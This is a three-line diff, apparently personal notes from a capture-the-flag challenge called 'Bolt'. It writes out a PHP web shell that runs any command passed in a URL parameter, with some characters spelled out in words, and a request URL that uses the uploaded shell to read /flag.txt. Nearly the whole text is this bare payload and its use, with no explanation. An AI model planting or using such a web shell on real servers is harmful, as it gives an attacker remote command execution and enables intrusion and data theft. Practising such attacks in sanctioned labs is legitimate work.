@@ -1,0 +1,3 @@
+Bolt
+'<(questionmark)php echo system($_GET['cmd'](semicolon)(questionmark))>'
+ip:port/files/file.php?cmd=cat%20/flag.txt
